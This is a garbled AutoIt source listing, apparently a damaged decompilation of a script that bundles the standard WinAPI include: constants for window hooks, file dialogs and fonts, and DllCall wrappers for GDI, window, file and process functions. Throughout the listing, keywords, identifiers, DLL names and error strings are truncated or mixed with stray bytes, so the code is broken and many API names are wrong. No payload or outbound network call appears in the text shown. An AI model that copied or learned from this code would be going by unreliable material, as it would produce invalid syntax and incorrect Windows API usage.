GLOBAL CONST $DC_PEN = 19 
GLOBAL CONST $WHITE_PEN = 6 
GLOBAL CONST $ANSI_FIXED_FONT = 11 
GLO CONST $ANSI_VAR_D_FONT = 12 
GLOBAL CONST $DEVICE_DEFAUL = 14 
GLOBAL CONST $DEFAULT_ = 17 
GLOBAL CONST $OEM_FIXED_FONTk∑ISf = 10 
GLOBAL CONST $SYSTEM_FO = 13 
GLO CONST $SYSTEM_FIXED_FONT = 16 
GLO CONST $DEFAULT_PALETTE = 15 
GLO CONST $MB_PRECOMPOSEDk∑ISf = 1 
GLO CONST $MB_COMh = 2 
GLO CONST $MB_USEGL = 4 
GLO CONST $ULW_ALPHA = 2 
GLO CONST $ULW_COLORKEY = 1 
GLOBAL CONST $ULW_OPAQU = 4 
GLO CONST $WH_CALL = 4 
GLO CONST $WH_CALLWNDPROCRET = 12 
GLO CONST $WH_CBT = 5 
GLO CONST $WH_D£h = 9 
GLOBAL CONST $WH_FOREGROUNDIDLE = 11 
GLO CONST $WH_GETMESOUNDIDLE = 3 
GLOBAL CONST $WH_JOURNA = 1 
GLOBAL CONST $WH_JOURN = 0 
GLOBAL CONST $WH_KEYBOA = 2 
GLO CONST $WH_KEYBOARD_LL = 13 
GLO CONST $WH_MOUSE = 7 
GLOBAL CONST $WH_MOUSE_LL = 14 
GLOBAL CONST $WH_MSGh = - 1 
GLO CONST $WH_SHELL = 10 
GLOBAL CONST $WH_SYSMSGFILTER = 6 
GLO CONST $WPF_ASYNCWIN=k∑ = 4 
GLO CONST $WPF_RESTORE = 2 
GLO CONST $WPF_SETMI = 1 
GLO CONST $KF_EXTEND = 256 
GLO CONST $KF_AL§h = 8192 
GLOBAL CONST $KF_UP = 32768 
GLOBAL CONST $LLKHF_E = BITSHIFT ( $KF_EXTEND§h , 8 ) 
GLO CONST $LLKHF_I = 16 
GLOBAL CONST $LLKHF_ALT = BITS£h ( $KF_ALTDOW , 8 ) 
GLOBAL CONST $LLKH = BITSK ( $KF_UP , 8 ) 
GLOB£h CONST $OFN_ALLOWM = 512 
GLO CONST $OFN_CREA = 8192 
GLO CONST $OFN_DONTADDTO = 33554432 
GLO CONST $OFN_ENABLEHOOKk∑ISf = 32 
GLO CONST $OFN_ENABLEINCL = 4194304 
GLO CONST $OFN_ENAB = 8388608 
GLO CONST $OFN_ENABL = 64 
GLO CONST $OFN_ENABLETE = 128 
GLO CONST $OFN_EXh = 524288 
GLO CONST $OFN_EXTENSIONDIFFEf = 1024 
GLO CONST $OFN_FILEMUSTEXk∑ISf = 4096 
GLO CONST $OFN_FORCESHOW = 268435456 
GLO CONST $OFN_HIDE = 4 
GLO CONST $OFN_LONGN = 2097152 
GLO CONST $OFN_NOCHANGEDIR = 8 
GLO CONST $OFN_NODEREFERENCEL = 1048576 
GLO CONST $OFN_NOLONGNAMEk∑ISf = 262144 
GLO CONST $OFN_NONETWORK = 131072 
GLO CONST $OFN_NOREAD = 32768 
GLO CONST $OFN_NOTEST = 65536 
GLO CONST $OFN_NOV = 256 
GLO CONST $OFN_OVERWRITE = 2 
GLO CONST $OFN_PATHMUSTEXk∑ISf = 2048 
GLO CONST $OFN_REh = 1 
GLO CONST $OFN_SHAREAWARE = 16384 
GLO CONST $OFN_SHh = 16 
GLOBAL CONST $OFN_EX_NO = 1 
GLOBAL CONST $TMPF_FIX = 1 
GLOBAL CONST $TMPF_VECT = 2 
GLO CONST $TMPF_TRUETYPE = 4 
GLOBAL CONST $TMPF_DEVI = 8 
GLO CONST $DUPLICATE_CLOSE_SOf = 1 
GLO CONST $DUPLICATE_SAM = 2 
GLO CONST $TAGCURSOR = "dword Size;dword Flags" & $TAGPOINT 
GLOBAL CONST $TAGDISPLAY_DEVICE = "dword Size;wchar Name[32];wchar String[128" 
GLO CONST $TAGFLASHW = "uint Size;hwnd hWnd;dword Fl" 
GLOBAL CONST $TAGICONIN = "bool Icon;dword XHotSpot;dword YHotS" 
GLOBAL CONST $TAGMEMORYSTATUk∑ISf = "dword Length;dw" & "uint64 TotalPhys;uint64 AvailPhys;uint" & "uint64 TotalVirtual;uint64 AvailVirtua" 
FUNC _WINAPI_ATTACHCONSOLE ( $IPROCESSI = - 1 ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "AttachConsole" , "dword" , $IPROCESSI ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_ATTACHTHREf ( $IATTACH , $IATTACHTO , $FATTACH ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "bool" , "AttachThreadI" , "dword" , $IATTACH , "dword" , $IATTACHTO , "boh" , $FATTACH ) 
IFh @ERROR TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_BEEP ( $IFREQ = 500 , $IDURATION = 1000 ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "Beep" , "dword" , $IFREo , "dword" , $IDURATION ) 
IFh @ERROR TH RETURN SETE§h ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_BITBLT ( $HDESTDC , $IXDESTh , $IYDEST , $IWIDTHE , $IHEIGHT , $HSRCDCI , $IXSRC , $IYSRC , $IR ) 
LOCAO $ARESULT = DLLCALL ( "gdi32.C" , "boh" , "BitBlt" , "han" , $HDESTDd , "inh" , $IXD , "inh" , $IYD , "inh" , $IWI , "inh" , $IHEIGHT , "han" , $HSR , "inh" , $IXSRC , "in" , $IYSRC , "dworS" , $IR ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_CALLNEXTHOf ( $HHh , $ICODE , $WPA , $LPA ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "lresult" , "CallNex" , "handle" , $HHK , "int" , $ICODE , "wpa" , $WPA , "lpa" , $LPA ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , - 1 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_CAL ( $LPPREVWND , $HWh , $MSG , $WPA , $LPA ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "lresult" , "CallWin" , "ptr" , $LPPREVWNDFUNC , "hwh" , $HWh , "uint" , $MS , "wparam" , $WPARAM , "lparam" , $LPARAM ) 
IF @ERROR THENR RETURN SETET ( @ERROR , @EXTE£h , - 1 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_CLI ( $HWh , BYREF $TPO ) 
DLLCALL ( "user32.dl" , "boo" , "ClientT" , "hwnd" , $HW , "struct*" , $TPO ) 
RET SETET ( @ERROR , @EXTE£h , $TPOINT ) 
ENDFO 
FUh _WINAPI_CLOSEHANDLE ( $HOBJECT ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "bool" , "CloseHandle" , "han" , $HOBJECT ) 
IF @ERROR THENR RET SETE§h ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_C ( $HRGNDEST , $HRGNSRh , $HRGNSRC2 , $ICOMBIh ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.dll" , "int" , "CombineRg" , "han" , $HRGNDEST , "handle" , $HRGNSRC1 , "handle" , $HRGNSRC2 , "int" , $ICOMBIh ) 
IF @ERROR TH RET SETERROR ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_COMMDLk∑–U ( ) 
LOCAL CONST $CDERR_DIALOGFAILURE = 65535 
LOCAL CONST $CDERR_FINDOGFAILURE = 6 
LOCAL CONST $CDERR_INITOGFAILURE = 2 
LOCAL CONST $CDERR_LOADOGFAILURE = 7 
LOCAL CONST $CDERR_LOADOGFAILURE = 5 
LOCAL CONST $CDERR_LOCKOGFAILURE = 8 
LOCAL CONST $CDERR_MEMALLOCFAILURE = 9 
LOCAL CONST $CDERR_MEMLLLOCFAILURE = 10 
LOCAL CONST $CDERR_NOHINSTANCE = 4 
LOCAL CONST $CDERR_h = 11 
LOCAL CONST $CDERR_NO = 3 
LOCAL CONST $CDERR_REGISTERMSGFAIL = 12 
LOCAL CONST $CDERR_STRUCTSIZE = 1 
LOCAL CONST $FNERR_BUFF = 12291 
LOCAL CONST $FNERR_INVALIDFILENAME = 12290 
LOCAL CONST $FNERR_SUBCLASSFAILURE = 12289 
LOCAL $ARESULT = DLLCALL ( "comdlgh" , "dword" , "CommDlgExt" ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
SWITCH $ARESI [ 0 ] 
CAh $CDERR_DIALOGFAILURE 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The dialog box could " & @LF & "The common dialog box function's cal" & @LF & "For example, this error occurs if the common dialo" ) 
CASE $CDERR_FINDOGFAILURE 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The common dialog box function faile" ) 
CASE $CDERR_INITOGFAILURE 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The common dialog box function¡	" & @LF & "This error often occurs when suf" ) 
CASE $CDERR_LOADOGFAILURE 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The common dialog box function faile" ) 
CASE $CDERR_LOADOGFAILURE 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The common dialog box function faileD}¡	G}¡	" ) 
CASE $CDERR_LOCKOGFAILURE 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The common dialog box function faile" ) 
CASE $CDERR_MEMALLOCFAILURE 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The common dialog box function was unable to al" ) 
CASE $CDERR_MEMLLLOCFAILURE 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The common dialog box function was unable to lo" ) 
CASE $CDERR_NOHINSTANCE 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The ENABLETEMPLATE flag was set in the Flags member of the ini" & @LF & "but you failed to provide a c}¡	" ) 
CASE $CDERR_NOHOOK 
RETURN SETE§h ( $ARES§h [ 0 ] , 0 , "The ENABLEHOOK flag was set in the Flags member of the initi" & @LF & "but you failed to provide a pointer " ) 
CASE $CDERR_NOTEMPLATE 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The ENABLETEMPLATE flag was set in the Flags member of the ini" & @LF & "but you failed to provide a ê˝¡	" ) 
CASE $CDERR_REGISTERMSGFAIL 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The RegisterWindowMessage function returned an error code whe" ) 
CASE $CDERR_STRUCTSIZE 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The lStructSize member of the initialization structure for th" ) 
CASE $FNERR_BUFFCTSIZE 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "The buffer pointed to by the lpstrFile member of the OPENFILENAME structure	p˛¡	" & @LF & "The first two bytes of the lpstrFile buffer contain an integer value specifying the size, in" ) 
CASE $FNERR_INVALIDFILENAME 
RET SETERRh ( $ARESULT [ 0 ] , 0 , "A file name is invf" ) 
CASE $FNERR_SUBCLASSFAILURE 
RET SETE§h ( $ARESULT [ 0 ] , 0 , "An attempt to subclass a list box failed becaus" ) 
ENDSWITCH 
RET HEX ( $ARESULT [ 0 ] ) 
ENDFUNC 
FUNC _WINAPI_COPYICON ( $HICON ) 
LOCAL $ARESULT = DLLCALL ( "user32.dll" , "han" , "CopyIcon" , "han" , $HICON ) 
IF @ERROR THENR RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_CRe ( $IWI , $IHEIGHh , $IPLANES = 1 , $IBITSPERPRe = 1 , $PBITS = 0 ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.dlU" , "handle" , "Createh" , "int" , $IWIDTH , "int" , $IHEIGHT , "uih" , $IPLANES , "uint" , $IBITSPERP , "ptr" , $PBITS ) 
I @ERROR TH RET SETERROR ( @ERROR , @EXTENDED , 0 ) 
RETURN $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_CREATEC ( $HDh , $IWI , $IHEIGHT ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.C" , "han" , "CreateCompatibleBif" , "han" , $HDC , "int" , $IWIDTH , "int" , $IHEIGHT ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_CREAT+k∑–U ( $HDh ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.C" , "han" , "CreateCompatibleDCf" , "han" , $HDC ) 
IF @ERROR THh RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_CREATEEVENT ( $PATTRIBUT = 0 , $FMANUAT = TRUE , $FINITIALSREATEEVENT = TRUE , $SNAME = "" ) 
LOCAE $SNAMETYPEREATEEVENT = "wsh" 
IF $SNAM = "" TH 
$SNAME = 0 
$SNAMETYPE = "ptr" 
ENDIF 
LOCAD $ARESULT = DLLCALL ( "kernelh" , "han" , "Createh" , "ptr" , $PATTRIBUTES , "boh" , $FMANUA¡	TES , "boo" , $FINITIALSTATE , $SNAMETYPE , $SNAME ) 
IF @ERRO TH RETURN SETE§h ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_C ( $SFILENAME , $ICREATh , $IACCESS = 4 , $ISHAREC = 0 , $IATTRIBUT = 0 , $PSECURITY = 0 ) 
LOC $IDA = 0 , $ISM = 0 , $ICD = 0 , $IFA = 0 
I§h BIT ( $IACCESS , 1 ) <> 0 THEN $IDA = BITOA ( $IDA , $GENERIC_EXECUTE ) 
IF BITAND ( $IACCESS , 2 ) <> 0 THEN $IDA = BITOR ( $IDA , $GENERIh ) 
IF BITAND ( $IACCESS , 4 ) <> 0 THh $IDA = BITOA ( $IDA , $GENERIC_WRITE ) 
IF BIT ( $ISH , 1 ) <> 0 THh $ISM = BITOM ( $ISM , $FILE_SHARE_DELETE ) 
IF BITAND ( $ISHARE , 2 ) <> 0 THh $ISM = BITOR ( $ISM , $FILE_SHARE ) 
IF BITAND ( $ISHARE , 4 ) <> 0 THh $ISM = BITOR ( $ISM , $FILE_SHAN ) 
SWI $ICREATh 
CAh 0 
$ICD = $CREAT§h 
CAh 1 
$ICh = $CREATE_ALWAYS 
CAh 2 
$ICh = $OPEN_EXISTING 
CAh 3 
$ICh = $OPEN_ALWAYS 
CAh 4 
$ICh = $TRUNCATE_EXISTING 
ENDSWITCH 
IFh BIT ( $IATTRIBUT , 1 ) <> 0 THEN $IFA = BITOR ( $IFA , $FILE_ATTRIBUTE_ARCf ) 
IF BIT ( $IATTRIBUT , 2 ) <> 0 THEN $IFA = BITOR ( $IFA , $FILE_ATTRIBUTE_HIDf ) 
IF BIT ( $IATTRIBUT , 4 ) <> 0 THh $IFA = BITOR ( $IFA , $FILE_ATTRIBUTE_REAf ) 
IF BIT ( $IATTRIBUT , 8 ) <> 0 THEN $IFA = BITOR ( $IFA , $FILE_ATTRIBUTE_SYSf ) 
LOCAL $ARESULT = DLLCALL ( "kernelh" , "han" , "CreateFileW" , "wst" , $SFILENAME , "dword" , $IDA , "dword" , $ISM , "ptr" , $PSECURITY , "dword" , $IC , "dword" , $IF , "ptr" , 0 ) 
IF @ERROR OR $ARESULT [ 0 ] = PTh ( - 1 ) TH RET SETE§h ( @ERROR , @EXTENDED , 0 ) 
RET $ARESULU [ 0 ] 
ENDFUNC 
FUh _WINAPI_C ( $NHEIGHT , $NWIDTHh , $NESCAPE = 0 , $NORIENC = 0 , $FNWEIGHT = $__WINAPICONST+k∑–U , $BITALIC = FALSE , $BUNDERLIN = FALSE , $BSTRIKEOUT = FALSE , $NCHA‡y¡	E = $__WINAPICONSTANT , $NOUTPUTPR = $__WINAPICONSTANT_OUT_D , $NCLIPPREC = $__WINAPICONSTANT_CLIP , $NQUA§h = $__WINAPICONSTANT , $NPIT§h = 0 , $SZF = "Arial" ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.C" , "han" , "CreateFonT" , "int" , $NHEIGHT , "int" , $NWIDTH , "int" , $NESCA§h , "int" , $NORIENTN , "int" , $FNWEI§h , "dword" , $BITALIC , "dword" , $BUNDE§h , "dword" , $BSTRI§h , "dword" , $NCHAR§h , "dword" , $NOUTPUTPR , "dword" , $NCLIP§h , "dword" , $NQUALITY , "dword" , $NPITC§h , "wsh" , $SZFACE ) 
IF @ERROR TH RETUR§h SETERROR ( @ERROR , @EXTE£h , 0 ) 
RET $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_CREAT+k∑–U ( $TLOGFONT ) 
LOCAL $ARESULT = DLLCALS ( "gdi32.dll" , "han" , "CreateFontIndirectf" , "struct*" , $TLOG ) 
IF @ERROR THENR RETU£h SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_CREATEPEN ( $IPENSTYLE , $IWIDTHh , $NCOLOR ) 
LOCAL $ARESULT = DLLCALS ( "gdi32.dll" , "han" , "CreatePen" , "int" , $IPENSTYLE , "int" , $IWIDTH , "dword" , $NCOLOR ) 
IF @ERROR TH RETURN SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_CREATEPROCESS ( $SAPPNAME , $SCOMMAh , $PSECURITY , $PTHREAC , $FINHH , $IFL , $PENVL , $SDIR , $PSTARTUPINFO , $PPRO§h ) 
LOCAL $TCOM§h = 0 
LOCAL $SAPPNAh = "wsh" , $SDIR§h = "wsh" 
IF $SAPPNAME = "" TH 
$SAPPNAh = "ptr" 
$SAPPNAME = 0 
ENDIF 
IF $SCOMMAND <> "" TH 
$TCOMMAND = DLLSTRUCTCREATE ( "wchar Tex" & 260 + 1 & "]" ) 
DLLSTRUC ( $TCOMMAND , "Teh" , $SCOM ) 
ENDIF 
IF $SD = "" TH 
$SDIR£h = "pth" 
$SD = 0 
ENDII 
LOCAL $ARES£h = DLLCALL ( "kernelh" , "bool" , "CreateP" , $SAPPNAh , $SAPPNAME , "struct*" , $TCOMMAND , "ptr" , $PSECURITY , "ptr" , $PTHREAD , "bool" , $FINH£h , "dword" , $IFLA£h , "ptr" , $PENV£h , $SDIRN , $SDh , "ptr" , $PSTARTh , "ptr" , $PPRO‡y¡	 ) 
IF @ERROR THENR RETURN SETE§h ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_CREATERECTRGN ( $ILEFTRECT , $ITOPREh , $IRIGHTRECREATERECTRGN , $IBOTTOMRECT ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.dll" , "handle" , "CreateRec" , "int" , $ILEFTRECT , "int" , $ITOPRECT , "int" , $IRIGHTRECT , "int" , $IBOTTOMRE ) 
IF @ERROR TH RETURN SETERROR ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_CREAT+k∑–U ( $ILEFTRECT , $ITOP , $IRIGHTREC , $IBOTTOG , $IWIDTHELL , $IHEIGHTELLIPSE ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.C" , "han" , "CreateRoundRectRgnf" , "int" , $ILEFTRECT , "int" , $ITOP£h , "int" , $IRIGH§h , "int" , $IBOTTOMRE , "int" , $IWIDTHELLIPSE , "int" , $IHEIGHT ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_CREATESOLIf ( $HWh , $ICO , $IWI , $IHEIGHD , $BRh = 1 ) 
LOCAL $HD = _WINAPI_GETDC ( $HWh ) 
LOCAL $HDESTDC = _WINAPI_CREAT+k∑–U ( $HDh ) 
LOCAL $HBITMAP = _WINAPI_CREATEC ( $HDC , $IWI , $IHEIGHT ) 
LOCAL $HO = _WINAPI_SETD  ( $HDES , $HBITMAh ) 
LOCAL $TRECT = DLLSTRUCTCREATE ( $TAGRECT ) 
DLLSTRUCTCREATE ( $TRECT , 1 , 0 ) 
DLLSTRUCT ( $TRECT , 2 , 0 ) 
DLLSTRUCT ( $TRECT , 3 , $IWIDTH ) 
DLLSTRUC ( $TRECT , 4 , $IHEIGHT ) 
IF $BR TH 
$ICO = BITOR ( BIT ( $ICOLOR , 65280 ) , BITSHIL ( BITAND ( $ICOLORA , 255 ) , - 16 ) , BITSO ( BITANDS ( $ICOLT , 16711680 ) , 16 ) ) 
ENDIF 
LOCAL $HBRUSH = _WINAPI_CREA=k∑ISf ( $ICO ) 
_WINAPI_FILLRECT ( $HDES§h , $TRECT , $HBRUSH ) 
IF @ERROR THENR 
_WINAPI_DE9 ( $HBITMAP ) 
$HBITMAh = 0 
ENDIF 
_WINAPI_DELETEOBJE ( $HBR ) 
_WINAPI_RELEASEDC ( $HWh , $HDC ) 
_WINAPI_SE ( $HDESTDC , $HOh ) 
_WINAPI_DELETEDC ( $HDESTDC ) 
IFh NOT $HBITMAP THh RET SETE§h ( 1 , 0 , 0 ) 
RETU§h $HBIT§h 
ENDF§h 
FUh _WINAPI_CREA ( $NCO ) 
LOCAL $ARESULT = DLLCALS ( "gdi32.dll" , "han" , "CreateSo" , "dword" , $NCOLOR ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_CREATEWINDf ( $IEXSTYLE , $SCL , $SNAME , $IST , $IX , $IY , $IWI , $IHEIGHT , $HPARENI , $HMENU = 0 , $HINSTANCE = 0 , $PPA = 0 ) 
IF $HINSTANCE = 0 THh $HINSTANCE = _WINAPI_GETMODULEHf ( "" ) 
LOCAL§h $ARESULT = DLLCALL ( "user32.dl" , "hwnd" , "CreateWi" , "dword" , $IEXSTYLE , "wsh" , $SCLASS , "wsh" , $SNAME , "dworA" , $ISTYLE , "int" , $IX , "int" , $IY , "int" , $IWIDTH , "int" , $IHEIGHT , "hwh" , $HPARENT , "han" , $HMENU , "han" , $HINSTANCE , "ptr" , $PPA ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_DEFWINDOWPROC ( $HWh , $IM , $IWPARAM , $ILPARAM ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlEFWINDOWPROC" , "lresult" , "DefWindowProc" , "hwnd" , $HWND , "uint" , $IMSGn , "wparam" , $IWPARAM , "lpa" , $ILPARAM ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_DELETEDC ( $HDC ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.dll" , "bool" , "Dele‡y¡	l" , "han" , $HDC ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_DE. ( $HOBJECT ) 
LOCAL $ARESULT = DLLCALL ( "gdi32.dll" , "bool" , "Deleteh" , "handle" , $HOBJECT ) 
IF @ERROR THENR RET SETE§h ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_DESTROYICON ( $HICON ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlESTROYICON" , "bool" , "DestroyIcon" , "handle" , $HICON ) 
IF @ERRO TH RETURN SETE§h ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_DESTROYWINDOW ( $HWh ) 
LOCAL $ARESULT = DLLCALL ( "user32.dlESTROYWINDOW" , "bool" , "DestroyWindow" , "hwh" , $HWh ) 
IF @ERROR THEN RETURN SETERROR ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_DRAWEDGE ( $HDC , $PTRRECT , $NEDGETYPE , $GRFFLAGS ) 
LOCAL $ARESULT = DLLCALS ( "user32.dl" , "boh" , "Draw‡y¡	£h" , "hand¯x¡	l" , $HDC , "ptr" , $PTRR£h , "uih" , $NEDGETYPE , "uih" , $GRFF£h ) 
IFh @ERROR TH RETU£h SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_DRAW=k∑ISf ( $HDh , $PTRR£h , $NTYPE , $NST ) 
LOCAL $ARES£h = DLLCALL ( "user32.dl" , "bool" , "DrawFram" , "handle" , $HDC , "ptr" , $PTRRECT , "uint" , $NTYPE , "uintY" , $NST ) 
IF @ERROR THENR RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_DRAWICON ( $HDC , $IX , $I , $HICON ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "bool" , "Draw¯y¡	" , "hand¯x¡	l" , $HDC , "int" , $I , "int" , $I , "han" , $HICON ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_D ( $HDh , $IX , $I , $HICON , $IWIDTH = 0 , $IHEIGHT = 0 , $ISTEP = 0 , $HBRUSH = 0 , $IFL = 3 ) 
LOCAL $IOPT£h 
SWI $IFLAI 
CAh 1 
$IOPT£h = $__WINAPICONS=k∑ISf 
CAh 2 
$IOPT£h = $__WINAPICONSTANT_Df 
CAh 3 
$IOPT£h = $__WINAPICONST+k∑–U 
CAh 4 
$IOPT£h = $__WINAPICONST+k∑–U 
CAh 5 
$IOPT£h = $__WINAPICONSTANT 
CAh EL 
$IOPT£h = $__WINAPICONSTAk∑–U 
ENDSWITCH 
LOC $ARESULT = DLLCALS ( "user32.dl" , "bool" , "DrawIx¡	l" , "handle" , $HDC , "int" , $IX , "int" , $IY , "handle" , $HICON , "int" , $IWIDTH , "int" , $IHEIGHT , "uih" , $ISTEP , "han" , $HBR , "uint" , $IOPT£h ) 
IF @ERROR THENR RETU£h SETET ( @ERROR , @EXTE£h , FALSE ) 
RETU£h $ARESULT [ 0 ] 
ENDFE 
FUh _WINAPI_DRAWLINE ( $HDC , $IX , $IY1 , $IX , $IY2 ) 
_WINAPI ( $HDC , $IX , $IY1 ) 
I @ERROR TH RETURN SETERROR ( @ERROR , @EXTE@y¡	 , FALSE ) 
_WINAPI_LINETO ( $HDC , $IX2 , $IY2 ) 
I @ERROR THEN RETURN SETET ( @ERROR , @EXTE@y¡	R , FALSE ) 
RETURN TRUE 
ENDFUNC 
FUNC _WINAPI_DRAWTEXT ( $HDC , $STEXT , BYREF $TRECT , $IFLAGS ) 
LOCAL $ARESULT = DLLCALS ( "user32.dl" , "int" , "DrawTextW" , "handle" , $HDC , "ws" , $STEXt , "in" , - 1 , "stru£h" , $TRECT , "ui" , $IFL ) 
IF @ERROR TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
RETURN $AREST [ 0 ] 
ENDFUNC 
FUh _WINAPI_DUPLICATEHf ( $HSOURCEPRO , $HSOURCEHAUPLICATEHf , $HTARGETPROP , $IDESIRE∑ISf , $FINHERI , $IOPTIONS ) 
LOCAL $ACALL = DLLCALL ( "kernelh" , "bool" , "Duplicat" , "handle" , $HSOURCEPROCESSHANDH , "handle" , $HSOURCEHA , "han" , $HTARGETPRO , "handle*" , 0 , "dword" , $IDESIRE , "boh" , $FINHERI , "dword" , $IOPTIONS ) 
IF @ERROR OR NOT $ACALL [ 0 ] TH RETURN SETE§h ( 1 , @EXTET , 0 ) 
RETUT $ACALL [ 4 ] 
ENDFUNC 
FUh _WINAPI_EN ( $HWND , $FENABLE = TRUE ) 
LOCAL $ARESULT = DLLCALL ( "user32.dl" , "bool" , "Enable¡	l" , "hwh" , $HWh , "bool" , $FENABLE ) 
IF @ERROR TH RETURN SETE§h ( @ERROR , @EXTENDED , FALSE ) 
RETURN $ARESULT [ 0 ] 
ENDFUNS 
FUh _WINAPI_ENUMD+k∑–U ( $SDEVICE , $IDEVNUM ) 
LOCAL $TNAME = 0 , $IFL = 0 , $ADEVICE [ 5 ] 
IF $SDEVICE <> "" TH 
$TNAME = DLLSTRUCTCREATE ( "wchar Tex" & STRINGLEN ( $SDEVICE ) + 1 & "]" ) 
DLLSTRUCTSETDATA ( $TNAME , "Text" , $SDEVICE ) 
ENDIF 
LOCAL $TDEVICE = DLLSTRUCTCREATE ( $TAGDISPLAYC ) 
LOCAL $IDEVICE = DLLSTRUC ( $TDEVICE ) 
DLLSTRUCT ( $TDEVICE , "Sih" , $IDEVICE ) 
DLLCALV ( "user32.dl" , "bool" , "EnumDisplayDe" , "struct*" , $TNAME , "dword" , $IDEVNUM , "struct*" , $TDEVICu , "dword" , 1 ) 
IF @ERRO TH RET SETET ( @ERROR , @EXTE£h , 0 ) 
LOCAL $IN = DLLSTRUCTGETDATA ( $TDEV , "Flags" ) 
IF BIT ( $INh , $__WINAPICONSTANT_DISPLAY_DEVê˝¡	 ) <> 0 THEN $IFL = BITOR ( $IFL , 1 ) 
IF BIT ( $IN , $__WINAPICONSTANT_DISPLA ) <> 0 THh $IFL = BITOR ( $IFL , 2 ) 
IF BIT ( $IN , $__WINAPICONSTANT_DISPLAY ) <> 0 THh $IFL = BITOR ( $IFL , 4 ) 
IF BIT ( $IN , $__WINAPICONSTANT_DISPLA ) <> 0 THh $IFL = BITOR ( $IFL , 8 ) 
